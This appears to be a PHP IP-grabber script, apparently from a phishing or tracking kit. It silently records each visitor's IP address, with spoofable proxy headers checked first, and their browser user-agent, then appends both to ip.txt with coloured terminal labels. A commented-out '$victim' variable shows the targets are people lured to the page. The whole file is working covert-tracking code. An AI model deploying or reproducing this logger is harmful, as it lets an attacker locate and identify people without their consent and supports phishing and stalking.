<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
//$victim = "IP: ";
$fp = fopen($file, 'a');

//fwrite($fp, $victim);
fwrite($fp, "\e[1;34m IP: \e[0;32m" . $ipaddress);
// fwrite($fp, $useragent);
fwrite($fp, "\e[1;34m Navegador: \e[0;32m" . $browser);


fclose($fp);
